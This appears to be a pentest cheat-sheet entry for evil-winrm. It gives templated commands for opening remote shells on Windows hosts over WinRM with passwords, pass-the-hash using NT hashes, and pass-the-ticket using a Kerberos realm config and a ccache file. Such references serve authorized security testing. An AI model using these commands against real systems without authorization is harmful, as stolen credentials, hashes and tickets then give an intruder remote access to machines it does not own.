# evil-winrm
% windows, remote, winrm, evilwinrm, 5985, 5986
#plateform/linux  #target/remote  #protocol/winrm #port/5985 #port/5986 #cat/ATTACK/CONNECT 

## local account with creds
```bash
evil-winrm -i <ip> -u <user> -p <password>
```
## domain account with creds
```bash
evil-winrm -i <ip> -u <user>@<domain_fqdn> -p <password>
```

## local account pth
```bash
evil-winrm -i <ip> -u <user> -H <nt_hash>
```

## domain account pth
```bash
evil-winrm -i <ip> -u <user>@<domain_fqdn> -H <nt_hash>
```

## pass the ticket
add realm /etc/krb5.conf
[libdefaults]
        rdns=false
[realms]
CONTOSO.COM = {
             kdc = fooserver.contoso.com
 }
```bash
export KRB5CCNAME=<ccache> && evil-winrm -i <target_fqdn>  --realm <domain_fqdn>
```